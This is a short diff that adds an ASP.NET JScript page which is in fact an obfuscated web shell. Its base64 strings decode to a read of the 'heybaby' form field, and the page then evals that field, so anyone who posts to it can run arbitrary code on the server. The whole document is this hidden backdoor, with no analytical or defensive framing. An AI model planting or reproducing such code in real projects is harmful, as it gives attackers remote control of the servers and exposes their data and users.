@@ -1,0 +1,7 @@
+<%@ Page Language="Jscript"Debug=true%>
+<%
+var a=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5Gb3JtWyJoZXliYWJ5Il0="));
+var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZGVmZw=="));
+var c=eval(a,b);
+eval(c,b);
+%>
